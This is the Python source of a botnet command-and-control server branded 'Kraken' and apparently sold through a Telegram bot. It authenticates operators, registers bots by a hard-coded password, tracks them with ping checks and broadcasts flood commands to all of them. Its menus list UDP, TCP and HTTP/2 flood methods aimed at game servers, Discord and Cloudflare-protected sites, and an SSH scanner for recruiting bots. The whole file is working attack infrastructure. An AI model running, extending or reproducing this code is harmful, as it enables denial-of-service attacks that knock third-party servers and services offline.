import socket
import threading
import sys
import time
import ipaddress
from colorama import Fore, init

bots = {}
ansi_clear = '\033[2J\033[H'

banner = f'''

 Hello, {Fore.RED}root{Fore.LIGHTWHITE_EX}, welcome to {Fore.RED}Kraken{Fore.LIGHTWHITE_EX}.
 Please type "{Fore.RED}help{Fore.LIGHTWHITE_EX}" to continue.

 {Fore.RED}>{Fore.LIGHTWHITE_EX} Our Telegram: {Fore.RED}@krakenautobuy_bot{Fore.LIGHTWHITE_EX}

 Attack syntax L4{Fore.RED}:{Fore.LIGHTWHITE_EX} [{Fore.RED}METHOD{Fore.LIGHTWHITE_EX}] [{Fore.RED}TARGET{Fore.LIGHTWHITE_EX}] [{Fore.RED}PORT{Fore.LIGHTWHITE_EX}] [{Fore.RED}TIME{Fore.LIGHTWHITE_EX}]
 Attack syntax L7{Fore.RED}:{Fore.LIGHTWHITE_EX} [{Fore.RED}METHOD{Fore.LIGHTWHITE_EX}] [{Fore.RED}TARGET{Fore.LIGHTWHITE_EX}] [{Fore.RED}TIME{Fore.LIGHTWHITE_EX}]

'''

menu = f'''
{Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}RULES   {Fore.LIGHTWHITE_EX}View the TOS of our service.
{Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}METHODS {Fore.LIGHTWHITE_EX}View the methods page.
{Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}CLEAR   {Fore.LIGHTWHITE_EX}Clear the terminal.
{Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}PING    {Fore.LIGHTWHITE_EX}ICMP ping an IP address.
'''

methods = f'''
[{Fore.LIGHTRED_EX}L4 Methods{Fore.LIGHTWHITE_EX}]
  {Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}UDPPLAIN   {Fore.LIGHTWHITE_EX}Plain UDP data optimized for high gbps & pps.
  {Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}UDPKILL    {Fore.LIGHTWHITE_EX}Custom UDP bypass + Randomized UDP data (Large Packets) + Randomized Strings.
  {Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}UDPAMP     {Fore.LIGHTWHITE_EX}Domain Name System Amplification Attack + Very Large Byte Size.
  {Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}GAME       {Fore.LIGHTWHITE_EX}Muti Query UDP Flood + Dynamic String UDP Flood.
  {Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}TCP        {Fore.LIGHTWHITE_EX}Cookie flood + MD Window Reset ACK Flood + Simple TL Exploit.
  {Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}HANDSHAKE  {Fore.LIGHTWHITE_EX}Handshake with high socket flood with & without data + Spoofed SYN.
  {Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}SOCKET     {Fore.LIGHTWHITE_EX}Basic socket flood with high connection rate flood.
  {Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}DISCORD    {Fore.LIGHTWHITE_EX}UDP flood using static data for Discord VoIP servers.

[{Fore.LIGHTRED_EX}L4 Methods GAME{Fore.LIGHTWHITE_EX}]
  {Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}MINECRAFT {Fore.LIGHTWHITE_EX}Advanced TCP flood with dynamic packets for Minecraft server bypass.
  {Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}FIVEM     {Fore.LIGHTWHITE_EX}Proxy based FiveM bypass + Realistic packet flow with token flood.
  {Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}FORTNITE  {Fore.LIGHTWHITE_EX}Custom UDP bypass with high packet flood.
  {Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}RUST      {Fore.LIGHTWHITE_EX}Custom UDP bypass with high packet flood and payloads.
  {Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}ROBLOX    {Fore.LIGHTWHITE_EX}High-efficiency UDP flood with advanced evasion for Roblox servers.

[{Fore.LIGHTRED_EX}L7 Methods{Fore.LIGHTWHITE_EX}]
  {Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}TLS       {Fore.LIGHTWHITE_EX}HTTP/2 Flood, TLS Queries with Mass Users Agents, Referrers, and Headers.
  {Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}BYPASS    {Fore.LIGHTWHITE_EX}HTTP/2 Flood, optimized for high RPS and high bypass rate.
  {Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}CFB       {Fore.LIGHTWHITE_EX}HTTP/2 Flood, optimized for CloudFlare, high RPS and low HTTP-DDoS detection.
  {Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}RAWH2     {Fore.LIGHTWHITE_EX}HTTP/2 Flood, Universal Compatibility.
  {Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}RAWH1     {Fore.LIGHTWHITE_EX}HTTP/1 Flood, Universal Compatibility.
  {Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}BROWSER   {Fore.LIGHTWHITE_EX}HTTP/2 Flood with browser emulation, optimized for CAPTCHA/UAM.
'''

admin_panel = f'''
  {Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}SCANNER {Fore.LIGHTWHITE_EX}[{Fore.RED}ssh/yarn{Fore.LIGHTWHITE_EX}] [{Fore.RED}on/off{Fore.LIGHTWHITE_EX}]
  {Fore.RED}> {Fore.LIGHTWHITE_EX}{Fore.RED}ADD {Fore.LIGHTWHITE_EX}[{Fore.RED}user{Fore.LIGHTWHITE_EX}] [{Fore.RED}password{Fore.LIGHTWHITE_EX}]
'''

def validate_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private
    
def validate_port(port, rand=False):
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

def validate_time(time):
    return time.isdigit() and int(time) >= 10 and int(time) <= 1300

def validate_size(size):
    return size.isdigit() and int(size) > 1 and int(size) <= 65500

def find_login(username, password):
    credentials = [x.strip() for x in open('logins.txt').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split(':')
        if c_username.lower() == username.lower() and c_password == password:
            return True

def send(socket, data, escape=True, reset=True):
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

def broadcast(data):
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data} 32', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

def ping():
    while 1:
        dead_bots = []
        for bot in bots.keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)

def update_title(client, username):
    while 1:
        try:
            send(client, f'\33]0;Kraken | Servers: {len(bots)}\a', False)
            time.sleep(2)
        except:
            client.close()

def command_line(client, username):
    for x in banner.split('\n'):
        send(client, x)

    prompt = f'[{Fore.RED}{username}{Fore.LIGHTWHITE_EX}@{Fore.RED}botnet{Fore.LIGHTWHITE_EX}]: '
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()
            
            if command == 'HELP':
                send(client, ansi_clear, False)
                for x in menu.split('\n'):
                    send(client, x)

            elif command == 'METHODS':
                send(client, ansi_clear, False)
                for x in methods.split('\n'):
                    send(client, x)

            elif command == 'HELP_ADMIN':
                send(client, ansi_clear, False)
                for x in admin_panel.split('\n'):
                    send(client, x)

            elif command == 'CLEAR':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)

            elif command == 'LOGOUT':
                send(client, 'Goodbye :-)')
                time.sleep(1)
                break

            elif command == 'TLS':
                if len(args) == 3:
                    url = args[1]
                    secs = args[2]
                    if validate_ip('1.1.1.1'):
                        if validate_time(secs):
                            send(client, ansi_clear, False)
                            send(client, f'')
                            send(client, f'Attack successfully broadcasted{Fore.LIGHTWHITE_EX}:')
                            send(client, f' {Fore.RED}> {Fore.LIGHTWHITE_EX}Host:     [{Fore.RED}{url}{Fore.LIGHTWHITE_EX}]')
                            send(client, f' {Fore.RED}> {Fore.LIGHTWHITE_EX}Port:     [{Fore.RED}443{Fore.LIGHTWHITE_EX}]')
                            send(client, f' {Fore.RED}> {Fore.LIGHTWHITE_EX}Time:     [{Fore.RED}{secs}{Fore.LIGHTWHITE_EX}]')
                            send(client, f' {Fore.RED}> {Fore.LIGHTWHITE_EX}Method:   [{Fore.RED}TLS{Fore.LIGHTWHITE_EX}]')
                            send(client, f'')
                            broadcast(data)
                        else:
                            send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, Fore.RED + 'Usage: TLS [URL] [PORT] [TIME]')

            elif command == 'BYPASS':
                if len(args) == 3:
                    url = args[1]
                    secs = args[2]
                    if validate_ip('1.1.1.1'):
                        if validate_time(secs):
                            send(client, ansi_clear, False)
                            send(client, f'')
                            send(client, f'Attack successfully broadcasted{Fore.LIGHTWHITE_EX}:')
                            send(client, f' {Fore.RED}> {Fore.LIGHTWHITE_EX}Host:     [{Fore.RED}{url}{Fore.LIGHTWHITE_EX}]')
                            send(client, f' {Fore.RED}> {Fore.LIGHTWHITE_EX}Port:     [{Fore.RED}443{Fore.LIGHTWHITE_EX}]')
                            send(client, f' {Fore.RED}> {Fore.LIGHTWHITE_EX}Time:     [{Fore.RED}{secs}{Fore.LIGHTWHITE_EX}]')
                            send(client, f' {Fore.RED}> {Fore.LIGHTWHITE_EX}Method:   [{Fore.RED}BYPASS{Fore.LIGHTWHITE_EX}]')
                            send(client, f'')
                            broadcast(data)
                        else:
                            send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, Fore.RED + 'Usage: BYPASS [URL] [PORT] [TIME]')

            else:
                send(client, Fore.RED + 'Unknown Command')

            send(client, prompt, False)
        except:
            break
    client.close()

def handle_client(client, address):
    send(client, f'\33]0;Kraken | Login\a', False)

    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.LIGHTRED_EX}Username{Fore.LIGHTWHITE_EX}: ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    password = ''
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.LIGHTRED_EX}Password{Fore.LIGHTWHITE_EX}:{Fore.BLACK} ', False, False)
        while not password.strip():
            password = client.recv(1024).decode('cp1252').strip()
        break
        
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(username, password):
            send(client, Fore.RED + 'Invalid credentials')
            time.sleep(1)
            client.close()
            return

        threading.Thread(target=update_title, args=(client, username)).start()
        threading.Thread(target=command_line, args=[client, username]).start()

    else:
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bots.update({client: address})
    
def main():
    if len(sys.argv) != 2:
        print(f'Usage: python {sys.argv[0]} <c2 port>')
        exit()

    port = sys.argv[1]
    if not port.isdigit() or int(port) < 1 or int(port) > 65535:
        print('Invalid C2 port')
        exit()
    port = int(port)
    
    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        sock.bind(('0.0.0.0', port))
    except:
        print('Failed to bind port')
        exit()

    sock.listen()

    threading.Thread(target=ping).start()

    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    main()